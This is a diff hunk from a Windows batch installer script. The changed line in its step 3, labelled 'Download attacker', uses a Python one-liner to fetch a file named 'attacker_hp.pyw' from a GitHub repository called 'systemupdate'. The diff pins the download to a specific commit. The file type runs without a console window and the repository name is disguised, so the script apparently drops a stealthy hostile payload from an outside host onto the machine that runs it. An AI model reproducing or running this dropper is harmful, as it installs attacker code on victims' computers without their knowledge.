@@ -46,7 +46,7 @@ echo Packages OK.
 
 :: === Step 3: Download attacker ===
 echo [3/4] Downloading attacker...
-python -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/attacker_hp.pyw?t=%RANDOM%', r'%~dp0attacker_hp.pyw')"
+python -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/blacknut0319-del/systemupdate/e2c0f9fc/attacker_hp.pyw?t=%RANDOM%', r'%~dp0attacker_hp.pyw')"
 if %errorlevel% neq 0 (
     echo ERROR: Download failed.
     pause
